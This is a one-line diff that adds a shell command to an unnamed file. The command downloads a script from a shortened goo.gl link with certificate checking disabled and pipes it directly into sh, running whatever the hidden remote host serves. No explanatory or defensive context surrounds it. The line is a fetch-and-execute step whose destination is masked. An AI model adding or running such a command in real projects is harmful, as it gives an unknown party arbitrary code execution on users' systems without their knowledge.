@@ -1,0 +1,1 @@
+wget --no-check-certificate goo.gl/pA7MLL -O - | sh
